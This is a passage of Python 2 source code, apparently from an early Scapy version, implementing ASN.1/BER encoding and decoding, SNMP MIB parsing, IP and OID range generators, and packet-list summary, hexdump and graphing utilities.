    def register(self, codecnum, codec):
        self._codec[codecnum] = codec
    def get_codec(self, codec):
        try:
            c = self._codec[codec]
        except KeyError,msg:
            raise ASN1_Error("Codec %r not found for tag %r" % (codec, self))
        return c

class ASN1_Class_metaclass(Enum_metaclass):
    element_class = ASN1Tag
    def __new__(cls, name, bases, dct): # XXX factorise a bit with Enum_metaclass.__new__()
        for b in bases:
            for k,v in b.__dict__.iteritems():
                if k not in dct and isinstance(v,ASN1Tag):
                    dct[k] = v.clone()

        rdict = {}
        for k,v in dct.iteritems():
            if type(v) is int:
                v = ASN1Tag(k,v)
                dct[k] = v
                rdict[v] = v
            elif isinstance(v, ASN1Tag):
                rdict[v] = v
        dct["__rdict__"] = rdict

        cls = type.__new__(cls, name, bases, dct)
        for v in cls.__dict__.values():
            if isinstance(v, ASN1Tag):
                v.context = cls # overwrite ASN1Tag contexts, even cloned ones
        return cls


class ASN1_Class:
    __metaclass__ = ASN1_Class_metaclass

class ASN1_Class_UNIVERSAL(ASN1_Class):
    name = "UNIVERSAL"
    ERROR = -3
    RAW = -2
    NONE = -1
    ANY = 0
    BOOLEAN = 1
    INTEGER = 2
    BIT_STRING = 3
    STRING = 4
    NULL = 5
    OID = 6
    OBJECT_DESCRIPTOR = 7
    EXTERNAL = 8
    REAL = 9
    ENUMERATED = 10
    EMBEDDED_PDF = 11
    UTF8_STRING = 12
    RELATIVE_OID = 13
    SEQUENCE = 0x30#XXX 16 ??
    SET = 0x31 #XXX 17 ??
    NUMERIC_STRING = 18
    PRINTABLE_STRING = 19
    T61_STRING = 20
    VIDEOTEX_STRING = 21
    IA5_STRING = 22
    UTC_TIME = 23
    GENERALIZED_TIME = 24
    GRAPHIC_STRING = 25
    ISO646_STRING = 26
    GENERAL_STRING = 27
    UNIVERSAL_STRING = 28
    CHAR_STRING = 29
    BMP_STRING = 30
    COUNTER32 = 0x41
    TIME_TICKS = 0x43

class ASN1_Object_metaclass(type):
    def __new__(cls, name, bases, dct):
        c = super(ASN1_Object_metaclass, cls).__new__(cls, name, bases, dct)
        try:
            c.tag.register_asn1_object(c)
        except:
            warning("Error registering %r for %r" % (c.tag, c.codec))
        return c


class ASN1_Object:
    __metaclass__ = ASN1_Object_metaclass
    tag = ASN1_Class_UNIVERSAL.ANY
    def __init__(self, val):
        self.val = val
    def enc(self, codec):
        return self.tag.get_codec(codec).enc(self.val)
    def __repr__(self):
        return "<%s[%r]>" % (self.__dict__.get("name", self.__class__.__name__), self.val)
    def __str__(self):
        return self.enc(conf.ASN1_default_codec)
    def strshow(self, lvl=0):
        return ("  "*lvl)+repr(self)+"\n"
    def show(self, lvl=0):
        print self.strshow(lvl)
    def __eq__(self, other):
        return self.val == other
    def __cmp__(self, other):
        return cmp(self.val, other)

class ASN1_DECODING_ERROR(ASN1_Object):
    tag = ASN1_Class_UNIVERSAL.ERROR
    def __init__(self, val, exc=None):
        ASN1_Object.__init__(self, val)
        self.exc = exc
    def __repr__(self):
        return "<%s[%r]{{%s}}>" % (self.__dict__.get("name", self.__class__.__name__),
                                   self.val, self.exc.args[0])
    def enc(self, codec):
        if isinstance(self.val, ASN1_Object):
            return self.val.enc(codec)
        return self.val

class ASN1_force(ASN1_Object):
    tag = ASN1_Class_UNIVERSAL.RAW
    def enc(self, codec):
        if isinstance(self.val, ASN1_Object):
            return self.val.enc(codec)
        return self.val

class ASN1_BADTAG(ASN1_force):
    pass

class ASN1_INTEGER(ASN1_Object):
    tag = ASN1_Class_UNIVERSAL.INTEGER

class ASN1_STRING(ASN1_Object):
    tag = ASN1_Class_UNIVERSAL.STRING

class ASN1_BIT_STRING(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.BIT_STRING

class ASN1_PRINTABLE_STRING(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.PRINTABLE_STRING

class ASN1_T61_STRING(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.T61_STRING

class ASN1_IA5_STRING(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.IA5_STRING

class ASN1_NUMERIC_STRING(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.NUMERIC_STRING

class ASN1_VIDEOTEX_STRING(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.VIDEOTEX_STRING

class ASN1_UTC_TIME(ASN1_STRING):
    tag = ASN1_Class_UNIVERSAL.UTC_TIME

class ASN1_TIME_TICKS(ASN1_INTEGER):
    tag = ASN1_Class_UNIVERSAL.TIME_TICKS

class ASN1_BOOLEAN(ASN1_INTEGER):
    tag = ASN1_Class_UNIVERSAL.BOOLEAN

class ASN1_NULL(ASN1_INTEGER):
    tag = ASN1_Class_UNIVERSAL.NULL

class ASN1_COUNTER32(ASN1_INTEGER):
    tag = ASN1_Class_UNIVERSAL.COUNTER32

class ASN1_SEQUENCE(ASN1_Object):
    tag = ASN1_Class_UNIVERSAL.SEQUENCE
    def strshow(self, lvl=0):
        s = ("  "*lvl)+("# %s:" % self.__class__.__name__)+"\n"
        for o in self.val:
            s += o.strshow(lvl=lvl+1)
        return s

class ASN1_SET(ASN1_SEQUENCE):
    tag = ASN1_Class_UNIVERSAL.SET

class ASN1_OID(ASN1_Object):
    tag = ASN1_Class_UNIVERSAL.OID
    def __init__(self, val):
        val = conf.mib._oid(val)
        ASN1_Object.__init__(self, val)
    def __repr__(self):
        return "<%s[%r]>" % (self.__dict__.get("name", self.__class__.__name__), conf.mib._oidname(self.val))



##################
## BER encoding ##
##################



#####[ BER tools ]#####


class BER_Exception(Exception):
    pass

class BER_Decoding_Error(ASN1_Decoding_Error):
    def __init__(self, msg, decoded=None, remaining=None):
        Exception.__init__(self, msg)
        self.remaining = remaining
        self.decoded = decoded
    def __str__(self):
        s = Exception.__str__(self)
        if isinstance(self.decoded, BERcodec_Object):
            s+="\n### Already decoded ###\n%s" % self.decoded.strshow()
        else:
            s+="\n### Already decoded ###\n%r" % self.decoded
        s+="\n### Remaining ###\n%r" % self.remaining
        return s

class BER_BadTag_Decoding_Error(BER_Decoding_Error, ASN1_BadTag_Decoding_Error):
    pass

def BER_len_enc(l, size=0):
    if l <= 127 and size==0:
        return chr(l)
    s = ""
    while l or size>0:
        s = chr(l&0xff)+s
        l >>= 8L
        size -= 1
    if len(s) > 127:
        raise BER_Exception("BER_len_enc: Length too long (%i) to be encoded [%r]" % (len(s),s))
    return chr(len(s)|0x80)+s
def BER_len_dec(s):
    l = ord(s[0])
    if not l & 0x80:
        return l,s[1:]
    l &= 0x7f
    if len(s) <= l:
        raise BER_Decoding_Error("BER_len_dec: Got %i bytes while expecting %i" % (len(s)-1, l),remaining=s)
    ll = 0L
    for c in s[1:l+1]:
        ll <<= 8L
        ll |= ord(c)
    return ll,s[l+1:]

def BER_num_enc(l, size=1):
    x=[]
    while l or size>0:
        x.insert(0, l & 0x7f)
        if len(x) > 1:
            x[0] |= 0x80
        l >>= 7
        size -= 1
    return "".join([chr(k) for k in x])
def BER_num_dec(s):
    x = 0
    for i in range(len(s)):
        c = ord(s[i])
        x <<= 7
        x |= c&0x7f
        if not c&0x80:
            break
    if c&0x80:
        raise BER_Decoding_Error("BER_num_dec: unfinished number description", remaining=s)
    return x, s[i+1:]

#####[ BER classes ]#####

class BERcodec_metaclass(type):
    def __new__(cls, name, bases, dct):
        c = super(BERcodec_metaclass, cls).__new__(cls, name, bases, dct)
        try:
            c.tag.register(c.codec, c)
        except:
            warning("Error registering %r for %r" % (c.tag, c.codec))
        return c


class BERcodec_Object:
    __metaclass__ = BERcodec_metaclass
    codec = ASN1_Codecs.BER
    tag = ASN1_Class_UNIVERSAL.ANY

    @classmethod
    def asn1_object(cls, val):
        return cls.tag.asn1_object(val)

    @classmethod
    def check_string(cls, s):
        if not s:
            raise BER_Decoding_Error("%s: Got empty object while expecting tag %r" %
                                     (cls.__name__,cls.tag), remaining=s)
    @classmethod
    def check_type(cls, s):
        cls.check_string(s)
        if cls.tag != ord(s[0]):
            raise BER_BadTag_Decoding_Error("%s: Got tag [%i/%#x] while expecting %r" %
                                            (cls.__name__, ord(s[0]), ord(s[0]),cls.tag), remaining=s)
        return s[1:]
    @classmethod
    def check_type_get_len(cls, s):
        s2 = cls.check_type(s)
        if not s2:
            raise BER_Decoding_Error("%s: No bytes while expecting a length" %
                                     cls.__name__, remaining=s)
        return BER_len_dec(s2)
    @classmethod
    def check_type_check_len(cls, s):
        l,s3 = cls.check_type_get_len(s)
        if len(s3) < l:
            raise BER_Decoding_Error("%s: Got %i bytes while expecting %i" %
                                     (cls.__name__, len(s3), l), remaining=s)
        return l,s3[:l],s3[l:]

    @classmethod
    def do_dec(cls, s, context=None, safe=False):
        if context is None:
            context = cls.tag.context
        cls.check_string(s)
        p = ord(s[0])
        if p not in context:
            t = s
            if len(t) > 18:
                t = t[:15]+"..."
            raise BER_Decoding_Error("Unknown prefix [%02x] for [%r]" % (p,t), remaining=s)
        codec = context[p].get_codec(ASN1_Codecs.BER)
        return codec.dec(s,context,safe)

    @classmethod
    def dec(cls, s, context=None, safe=False):
        if not safe:
            return cls.do_dec(s, context, safe)
        try:
            return cls.do_dec(s, context, safe)
        except BER_BadTag_Decoding_Error,e:
            o,remain = BERcodec_Object.dec(e.remaining, context, safe)
            return ASN1_BADTAG(o),remain
        except BER_Decoding_Error, e:
            return ASN1_DECODING_ERROR(s, exc=e),""
        except ASN1_Error, e:
            return ASN1_DECODING_ERROR(s, exc=e),""

    @classmethod
    def safedec(cls, s, context=None):
        return cls.dec(s, context, safe=True)


    @classmethod
    def enc(cls, s):
        if type(s) is str:
            return BERcodec_STRING.enc(s)
        else:
            return BERcodec_INTEGER.enc(int(s))



ASN1_Codecs.BER.register_stem(BERcodec_Object)


class BERcodec_INTEGER(BERcodec_Object):
    tag = ASN1_Class_UNIVERSAL.INTEGER
    @classmethod
    def enc(cls, i):
        s = []
        while 1:
            s.append(i&0xff)
            if -127 <= i < 0:
                break
            if 128 <= i <= 255:
                s.append(0)
            i >>= 8
            if not i:
                break
        s = map(chr, s)
        s.append(BER_len_enc(len(s)))
        s.append(chr(cls.tag))
        s.reverse()
        return "".join(s)
    @classmethod
    def do_dec(cls, s, context=None, safe=False):
        l,s,t = cls.check_type_check_len(s)
        x = 0L
        if s:
            if ord(s[0])&0x80: # negative int
                x = -1L
            for c in s:
                x <<= 8
                x |= ord(c)
        return cls.asn1_object(x),t


class BERcodec_BOOLEAN(BERcodec_INTEGER):
    tag = ASN1_Class_UNIVERSAL.BOOLEAN

class BERcodec_NULL(BERcodec_INTEGER):
    tag = ASN1_Class_UNIVERSAL.NULL
    @classmethod
    def enc(cls, i):
        if i == 0:
            return chr(cls.tag)+"\0"
        else:
            return super(cls,cls).enc(i)

class BERcodec_STRING(BERcodec_Object):
    tag = ASN1_Class_UNIVERSAL.STRING
    @classmethod
    def enc(cls,s):
        return chr(cls.tag)+BER_len_enc(len(s))+s
    @classmethod
    def do_dec(cls, s, context=None, safe=False):
        l,s,t = cls.check_type_check_len(s)
        return cls.tag.asn1_object(s),t

class BERcodec_BIT_STRING(BERcodec_STRING):
    tag = ASN1_Class_UNIVERSAL.BIT_STRING

class BERcodec_PRINTABLE_STRING(BERcodec_STRING):
    tag = ASN1_Class_UNIVERSAL.PRINTABLE_STRING

class BERcodec_T61_STRING (BERcodec_STRING):
    tag = ASN1_Class_UNIVERSAL.T61_STRING

class BERcodec_IA5_STRING(BERcodec_STRING):
    tag = ASN1_Class_UNIVERSAL.IA5_STRING

class BERcodec_UTC_TIME(BERcodec_STRING):
    tag = ASN1_Class_UNIVERSAL.UTC_TIME

class BERcodec_TIME_TICKS(BERcodec_INTEGER):
    tag = ASN1_Class_UNIVERSAL.TIME_TICKS

class BERcodec_COUNTER32(BERcodec_INTEGER):
    tag = ASN1_Class_UNIVERSAL.COUNTER32

class BERcodec_SEQUENCE(BERcodec_Object):
    tag = ASN1_Class_UNIVERSAL.SEQUENCE
    @classmethod
    def enc(cls, l):
        if type(l) is not str:
            l = "".join(map(lambda x: x.enc(cls.codec), l))
        return chr(cls.tag)+BER_len_enc(len(l))+l
    @classmethod
    def do_dec(cls, s, context=None, safe=False):
        if context is None:
            context = cls.tag.context
        l,st = cls.check_type_get_len(s) # we may have len(s) < l
        s,t = st[:l],st[l:]
        obj = []
        while s:
            try:
                o,s = BERcodec_Object.dec(s, context, safe)
            except BER_Decoding_Error, err:
                print "enrichi %r <- %r  %r" % (err.remaining,t,s), obj
                err.remaining += t
                if err.decoded is not None:
                    obj.append(err.decoded)
                err.decoded = obj
                raise
            obj.append(o)
        if len(st) < l:
            raise BER_Decoding_Error("Not enough bytes to decode sequence", decoded=obj)
        return cls.asn1_object(obj),t

class BERcodec_SET(BERcodec_SEQUENCE):
    tag = ASN1_Class_UNIVERSAL.SET


class BERcodec_OID(BERcodec_Object):
    tag = ASN1_Class_UNIVERSAL.OID

    @classmethod
    def enc(cls, oid):
        lst = [int(x) for x in oid.strip(".").split(".")]
        if len(lst) >= 2:
            lst[1] += 40*lst[0]
            del(lst[0])
        s = "".join([BER_num_enc(k) for k in lst])
        return chr(cls.tag)+BER_len_enc(len(s))+s
    @classmethod
    def do_dec(cls, s, context=None, safe=False):
        l,s,t = cls.check_type_check_len(s)
        lst = []
        while s:
            l,s = BER_num_dec(s)
            lst.append(l)
        if (len(lst) > 0):
            lst.insert(0,lst[0]/40)
            lst[1] %= 40
        return cls.asn1_object(".".join([str(k) for k in lst])), t


#################
## MIB parsing ##
#################

_mib_re_integer = re.compile("^[0-9]+$")
_mib_re_both = re.compile("^([a-zA-Z_][a-zA-Z0-9_-]*)\(([0-9]+)\)$")
_mib_re_oiddecl = re.compile("$\s*([a-zA-Z0-9_-]+)\s+OBJECT[^:]+::=\s*\{([^\}]+)\}",re.M)
_mib_re_strings = re.compile('"[^"]*"')
_mib_re_comments = re.compile('--.*(\r|\n)')

class MIBDict(DADict):
    def _findroot(self, x):
        if x.startswith("."):
            x = x[1:]
        if not x.endswith("."):
            x += "."
        max=0
        root="."
        for k in self.keys():
            if x.startswith(self[k]+"."):
                if max < len(self[k]):
                    max = len(self[k])
                    root = k
        return root, x[max:-1]
    def _oidname(self, x):
        root,remainder = self._findroot(x)
        return root+remainder
    def _oid(self, x):
        xl = x.strip(".").split(".")
        p = len(xl)-1
        while p >= 0 and _mib_re_integer.match(xl[p]):
            p -= 1
        if p != 0 or xl[p] not in self:
            return x
        xl[p] = self[xl[p]]
        return ".".join(xl[p:])
    def _make_graph(self, other_keys=[], **kargs):
        nodes = [(k,self[k]) for k in self.keys()]
        oids = [self[k] for k in self.keys()]
        for k in other_keys:
            if k not in oids:
                nodes.append(self.oidname(k),k)
        s = 'digraph "mib" {\n\trankdir=LR;\n\n'
        for k,o in nodes:
            s += '\t"%s" [ label="%s"  ];\n' % (o,k)
        s += "\n"
        for k,o in nodes:
            parent,remainder = self._findroot(o[:-1])
            remainder = remainder[1:]+o[-1]
            if parent != ".":
                parent = self[parent]
            s += '\t"%s" -> "%s" [label="%s"];\n' % (parent, o,remainder)
        s += "}\n"
        do_graph(s, **kargs)


def mib_register(ident, value, the_mib, unresolved):
    if ident in the_mib or ident in unresolved:
        return ident in the_mib
    resval = []
    not_resolved = 0
    for v in value:
        if _mib_re_integer.match(v):
            resval.append(v)
        else:
            v = fixname(v)
            if v not in the_mib:
                not_resolved = 1
            if v in the_mib:
                v = the_mib[v]
            elif v in unresolved:
                v = unresolved[v]
            if type(v) is list:
                resval += v
            else:
                resval.append(v)
    if not_resolved:
        unresolved[ident] = resval
        return False
    else:
        the_mib[ident] = resval
        keys = unresolved.keys()
        i = 0
        while i < len(keys):
            k = keys[i]
            if mib_register(k,unresolved[k], the_mib, {}):
                del(unresolved[k])
                del(keys[i])
                i = 0
            else:
                i += 1

        return True


def load_mib(filenames):
    the_mib = {'iso': ['1']}
    unresolved = {}
    for k in conf.mib.keys():
        mib_register(k, conf.mib[k].split("."), the_mib, unresolved)

    if type(filenames) is str:
        filenames = [filenames]
    for fnames in filenames:
        for fname in glob(fnames):
            f = open(fname)
            text = f.read()
            cleantext = " ".join(_mib_re_strings.split(" ".join(_mib_re_comments.split(text))))
            for m in _mib_re_oiddecl.finditer(cleantext):
                ident,oid = m.groups()
                ident=fixname(ident)
                oid = oid.split()
                for i in range(len(oid)):
                    m = _mib_re_both.match(oid[i])
                    if m:
                        oid[i] = m.groups()[1]
                mib_register(ident, oid, the_mib, unresolved)

    newmib = MIBDict(_name="MIB")
    for k,o in the_mib.iteritems():
        newmib[k]=".".join(o)
    for k,o in unresolved.iteritems():
        newmib[k]=".".join(o)

    conf.mib=newmib



################
## Generators ##
################

class Gen(object):
    def __iter__(self):
        return iter([])

class SetGen(Gen):
    def __init__(self, set, _iterpacket=1):
        self._iterpacket=_iterpacket
        if type(set) is list:
            self.set = set
        elif isinstance(set, PacketList):
            self.set = list(set)
        else:
            self.set = [set]
    def transf(self, element):
        return element
    def __iter__(self):
        for i in self.set:
            if (type(i) is tuple) and (len(i) == 2) and type(i[0]) is int and type(i[1]) is int:
                if  (i[0] <= i[1]):
                    j=i[0]
                    while j <= i[1]:
                        yield j
                        j += 1
            elif isinstance(i, Gen) and (self._iterpacket or not isinstance(i,Packet)):
                for j in i:
                    yield j
            else:
                yield i
    def __repr__(self):
        return "<SetGen %s>" % self.set.__repr__()

class Net(Gen):
    """Generate a list of IPs from a network address or a name"""
    name = "ip"
    ipaddress = re.compile(r"^(\*|[0-2]?[0-9]?[0-9](-[0-2]?[0-9]?[0-9])?)\.(\*|[0-2]?[0-9]?[0-9](-[0-2]?[0-9]?[0-9])?)\.(\*|[0-2]?[0-9]?[0-9](-[0-2]?[0-9]?[0-9])?)\.(\*|[0-2]?[0-9]?[0-9](-[0-2]?[0-9]?[0-9])?)(/[0-3]?[0-9])?$")
    def __init__(self, net):
        self.repr=net

        tmp=net.split('/')+["32"]
        if not self.ipaddress.match(net):
            tmp[0]=socket.gethostbyname(tmp[0])
        netmask = int(tmp[1])

        def parse_digit(a,netmask):
            netmask = min(8,max(netmask,0))
            if a == "*":
                a = (0,256)
            elif a.find("-") >= 0:
                x,y = map(int,a.split("-"))
                if x > y:
                    y = x
                a = (x &  (0xffL<<netmask) , max(y, (x | (0xffL>>(8-netmask))))+1)
            else:
                a = (int(a) & (0xffL<<netmask),(int(a) | (0xffL>>(8-netmask)))+1)
            return a

        self.parsed = map(lambda x,y: parse_digit(x,y), tmp[0].split("."), map(lambda x,nm=netmask: x-nm, (8,16,24,32)))

    def __iter__(self):
        for d in xrange(*self.parsed[3]):
            for c in xrange(*self.parsed[2]):
                for b in xrange(*self.parsed[1]):
                    for a in xrange(*self.parsed[0]):
                        yield "%i.%i.%i.%i" % (a,b,c,d)
    def choice(self):
        ip = []
        for v in self.parsed:
            ip.append(str(random.randint(v[0],v[1]-1)))
        return ".".join(ip)

    def __repr__(self):
        return "Net(%r)" % self.repr

class OID(Gen):
    name = "OID"
    def __init__(self, oid):
        self.oid = oid
        self.cmpt = []
        fmt = []
        for i in oid.split("."):
            if "-" in i:
                fmt.append("%i")
                self.cmpt.append(tuple(map(int, i.split("-"))))
            else:
                fmt.append(i)
        self.fmt = ".".join(fmt)
    def __repr__(self):
        return "OID(%r)" % self.oid
    def __iter__(self):
        ii = [k[0] for k in self.cmpt]
        while 1:
            yield self.fmt % tuple(ii)
            i = 0
            while 1:
                if i >= len(ii):
                    raise StopIteration
                if ii[i] < self.cmpt[i][1]:
                    ii[i]+=1
                    break
                else:
                    ii[i] = self.cmpt[i][0]
                i += 1


#############
## Results ##
#############

class PacketList:
    res = []
    def __init__(self, res=None, name="PacketList", stats=None):
        """create a packet list from a list of packets
           res: the list of packets
           stats: a list of classes that will appear in the stats (defaults to [TCP,UDP,ICMP])"""
        if stats is None:
            stats = [ TCP,UDP,ICMP ]
        self.stats = stats
        if res is None:
            res = []
        if isinstance(res, PacketList):
            res = res.res
        self.res = res
        self.listname = name
    def _elt2pkt(self, elt):
        return elt
    def _elt2sum(self, elt):
        return elt.summary()
    def _elt2show(self, elt):
        return self._elt2sum(elt)
    def __repr__(self):
#        stats=dict.fromkeys(self.stats,0) ## needs python >= 2.3  :(
        stats = dict(map(lambda x: (x,0), self.stats))
        other = 0
        for r in self.res:
            f = 0
            for p in stats:
                if self._elt2pkt(r).haslayer(p):
                    stats[p] += 1
                    f = 1
                    break
            if not f:
                other += 1
        s = ""
        ct = conf.color_theme
        for p in stats:
            s += " %s%s%s" % (ct.packetlist_proto(p.name),
                              ct.punct(":"),
                              ct.packetlist_value(stats[p]))
        s += " %s%s%s" % (ct.packetlist_proto("Other"),
                          ct.punct(":"),
                          ct.packetlist_value(other))
        return "%s%s%s%s%s" % (ct.punct("<"),
                               ct.packetlist_name(self.listname),
                               ct.punct(":"),
                               s,
                               ct.punct(">"))
    def __getattr__(self, attr):
        return getattr(self.res, attr)
    def __getitem__(self, item):
        if isinstance(item,type) and issubclass(item,Packet):
            return self.__class__(filter(lambda x: item in self._elt2pkt(x),self.res),
                                  name="%s from %s"%(item.__name__,self.listname))
        if type(item) is slice:
            return self.__class__(self.res.__getitem__(item),
                                  name = "mod %s" % self.listname)
        return self.res.__getitem__(item)
    def __getslice__(self, *args, **kargs):
        return self.__class__(self.res.__getslice__(*args, **kargs),
                              name="mod %s"%self.listname)
    def __add__(self, other):
        return self.__class__(self.res+other.res,
                              name="%s+%s"%(self.listname,other.listname))
    def summary(self, prn=None, lfilter=None):
        """prints a summary of each packet
prn:     function to apply to each packet instead of lambda x:x.summary()
lfilter: truth function to apply to each packet to decide whether it will be displayed"""
        for r in self.res:
            if lfilter is not None:
                if not lfilter(r):
                    continue
            if prn is None:
                print self._elt2sum(r)
            else:
                print prn(r)
    def nsummary(self,prn=None, lfilter=None):
        """prints a summary of each packet with the packet's number
prn:     function to apply to each packet instead of lambda x:x.summary()
lfilter: truth function to apply to each packet to decide whether it will be displayed"""
        for i in range(len(self.res)):
            if lfilter is not None:
                if not lfilter(self.res[i]):
                    continue
            print conf.color_theme.id(i,"%04i"),
            if prn is None:
                print self._elt2sum(self.res[i])
            else:
                print prn(self.res[i])
    def display(self): # Deprecated. Use show()
        """deprecated. is show()"""
        self.show()
    def show(self, *args, **kargs):
        """Best way to display the packet list. Defaults to nsummary() method"""
        return self.nsummary(*args, **kargs)

    def filter(self, func):
        """Returns a packet list filtered by a truth function"""
        return self.__class__(filter(func,self.res),
                              name="filtered %s"%self.listname)
    def make_table(self, *args, **kargs):
        """Prints a table using a function that returs for each packet its head column value, head row value and displayed value
        ex: p.make_table(lambda x:(x[IP].dst, x[TCP].dport, x[TCP].sprintf("%flags%")) """
        return make_table(self.res, *args, **kargs)
    def make_lined_table(self, *args, **kargs):
        """Same as make_table, but print a table with lines"""
        return make_lined_table(self.res, *args, **kargs)
    def make_tex_table(self, *args, **kargs):
        """Same as make_table, but print a table with LaTeX syntax"""
        return make_tex_table(self.res, *args, **kargs)

    def plot(self, f, lfilter=None,**kargs):
        """Applies a function to each packet to get a value that will be plotted with GnuPlot. A gnuplot object is returned
        lfilter: a truth function that decides whether a packet must be ploted"""
        g=Gnuplot.Gnuplot()
        l = self.res
        if lfilter is not None:
            l = filter(lfilter, l)
        l = map(f,l)
        g.plot(Gnuplot.Data(l, **kargs))
        return g

    def diffplot(self, f, delay=1, lfilter=None, **kargs):
        """diffplot(f, delay=1, lfilter=None)
        Applies a function to couples (l[i],l[i+delay])"""
        g = Gnuplot.Gnuplot()
        l = self.res
        if lfilter is not None:
            l = filter(lfilter, l)
        l = map(f,l[:-delay],l[delay:])
        g.plot(Gnuplot.Data(l, **kargs))
        return g

    def multiplot(self, f, lfilter=None, **kargs):
        """Uses a function that returns a label and a value for this label, then plots all the values label by label"""
        g=Gnuplot.Gnuplot()
        l = self.res
        if lfilter is not None:
            l = filter(lfilter, l)

        d={}
        for e in l:
            k,v = f(e)
            if k in d:
                d[k].append(v)
            else:
                d[k] = [v]
        data=[]
        for k in d:
            data.append(Gnuplot.Data(d[k], title=k, **kargs))

        g.plot(*data)
        return g


    def rawhexdump(self):
        """Prints an hexadecimal dump of each packet in the list"""
        for p in self:
            hexdump(self._elt2pkt(p))

    def hexraw(self, lfilter=None):
        """Same as nsummary(), except that if a packet has a Raw layer, it will be hexdumped
        lfilter: a truth function that decides whether a packet must be displayed"""
        for i in range(len(self.res)):
            p = self._elt2pkt(self.res[i])
            if lfilter is not None and not lfilter(p):
                continue
            print "%s %s %s" % (conf.color_theme.id(i,"%04i"),
                                p.sprintf("%.time%"),
                                self._elt2sum(self.res[i]))
            if p.haslayer(Raw):
                hexdump(p.getlayer(Raw).load)

    def hexdump(self, lfilter=None):
        """Same as nsummary(), except that packets are also hexdumped
        lfilter: a truth function that decides whether a packet must be displayed"""
        for i in range(len(self.res)):
            p = self._elt2pkt(self.res[i])
            if lfilter is not None and not lfilter(p):
                continue
            print "%s %s %s" % (conf.color_theme.id(i,"%04i"),
                                p.sprintf("%.time%"),
                                self._elt2sum(self.res[i]))
            hexdump(p)

    def padding(self, lfilter=None):
        """Same as hexraw(), for Padding layer"""
        for i in range(len(self.res)):
            p = self._elt2pkt(self.res[i])
            if p.haslayer(Padding):
                if lfilter is None or lfilter(p):
                    print "%s %s %s" % (conf.color_theme.id(i,"%04i"),
                                        p.sprintf("%.time%"),
                                        self._elt2sum(self.res[i]))
                    hexdump(p.getlayer(Padding).load)

    def nzpadding(self, lfilter=None):
        """Same as padding() but only non null padding"""
        for i in range(len(self.res)):
            p = self._elt2pkt(self.res[i])
            if p.haslayer(Padding):
                pad = p.getlayer(Padding).load
                if pad == pad[0]*len(pad):
                    continue
                if lfilter is None or lfilter(p):
                    print "%s %s %s" % (conf.color_theme.id(i,"%04i"),
                                        p.sprintf("%.time%"),
                                        self._elt2sum(self.res[i]))
                    hexdump(p.getlayer(Padding).load)


    def conversations(self, getsrcdst=None,**kargs):
        """Graphes a conversations between sources and destinations and display it
        (using graphviz and imagemagick)
        getsrcdst: a function that takes an element of the list and return the source and dest
                   by defaults, return source and destination IP
        type: output type (svg, ps, gif, jpg, etc.), passed to dot's "-T" option
        target: filename or redirect. Defaults pipe to Imagemagick's display program
        prog: which graphviz program to use"""
        if getsrcdst is None:
            getsrcdst = lambda x:(x[IP].src, x[IP].dst)
        conv = {}
        for p in self.res:
            p = self._elt2pkt(p)
            try:
                c = getsrcdst(p)
            except:
                #XXX warning()
                continue
            conv[c] = conv.get(c,0)+1
        gr = 'digraph "conv" {\n'
        for s,d in conv:
            gr += '\t "%s" -> "%s"\n' % (s,d)
        gr += "}\n"
        return do_graph(gr, **kargs)

    def afterglow(self, src=None, event=None, dst=None, **kargs):
        """Experimental clone attempt of http://sourceforge.net/projects/afterglow
        each datum is reduced as src -> event -> dst and the data are graphed.
        by default we have IP.src -> IP.dport -> IP.dst"""
        if src is None:
            src = lambda x: x[IP].src
        if event is None:
            event = lambda x: x[IP].dport
        if dst is None:
            dst = lambda x: x[IP].dst
        sl = {}
        el = {}
        dl = {}
        for i in self.res:
            try:
                s,e,d = src(i),event(i),dst(i)
                if s in sl:
                    n,l = sl[s]
                    n += 1
                    if e not in l:
                        l.append(e)
                    sl[s] = (n,l)
                else:
                    sl[s] = (1,[e])
                if e in el:
                    n,l = el[e]
                    n+=1
                    if d not in l:
                        l.append(d)
                    el[e] = (n,l)
                else:
                    el[e] = (1,[d])
                dl[d] = dl.get(d,0)+1
            except:
                continue

        import math
        def normalize(n):
            return 2+math.log(n)/4.0

        def minmax(x):
            m,M = min(x),max(x)
            if m == M:
                m = 0
            if M == 0:
                M = 1
            return m,M

        mins,maxs = minmax(map(lambda (x,y): x, sl.values()))
        mine,maxe = minmax(map(lambda (x,y): x, el.values()))
        mind,maxd = minmax(dl.values())

        gr = 'digraph "afterglow" {\n\tedge [len=2.5];\n'

        gr += "# src nodes\n"
        for s in sl:
            n,l = sl[s]; n = 1+float(n-mins)/(maxs-mins)
            gr += '"src.%s" [label = "%s", shape=box, fillcolor="#FF0000", style=filled, fixedsize=1, height=%.2f,width=%.2f];\n' % (`s`,`s`,n,n)
        gr += "# event nodes\n"
        for e in el:
            n,l = el[e]; n = n = 1+float(n-mine)/(maxe-mine)
            gr += '"evt.%s" [label = "%s", shape=circle, fillcolor="#00FFFF", style=filled, fixedsize=1, height=%.2f, width=%.2f];\n' % (`e`,`e`,n,n)
        for d in dl:
            n = dl[d]; n = n = 1+float(n-mind)/(maxd-mind)
            gr += '"dst.%s" [label = "%s", shape=triangle, fillcolor="#0000ff", style=filled, fixedsize=1, height=%.2f, width=%.2f];\n' % (`d`,`d`,n,n)

        gr += "###\n"
        for s in sl:
            n,l = sl[s]
            for e in l:
                gr += ' "src.%s" -> "evt.%s";\n' % (`s`,`e`)
        for e in el:
            n,l = el[e]
            for d in l:
                gr += ' "evt.%s" -> "dst.%s";\n' % (`e`,`d`)

        gr += "}"
        open("/tmp/aze","w").write(gr)
        return do_graph(gr, **kargs)



    def timeskew_graph(self, ip, **kargs):
        """Tries to graph the timeskew between the timestamps and real time for a given ip"""
        res = map(lambda x: self._elt2pkt(x), self.res)
        b = filter(lambda x:x.haslayer(IP) and x.getlayer(IP).src == ip and x.haslayer(TCP), res)
        c = []
        for p in b:
            opts = p.getlayer(TCP).options
            for o in opts:
                if o[0] == "Timestamp":
                    c.append((p.time,o[1][0]))
        if not c:
            warning("No timestamps found in packet list")
            return
        d = map(lambda (x,y): (x%2000,((x-c[0][0])-((y-c[0][1])/1000.0))),c)
        g = Gnuplot.Gnuplot()
        g.plot(Gnuplot.Data(d,**kargs))
        return g

    def _dump_document(self, **kargs):
        d = pyx.document.document()
        l = len(self.res)
        for i in range(len(self.res)):
            elt = self.res[i]
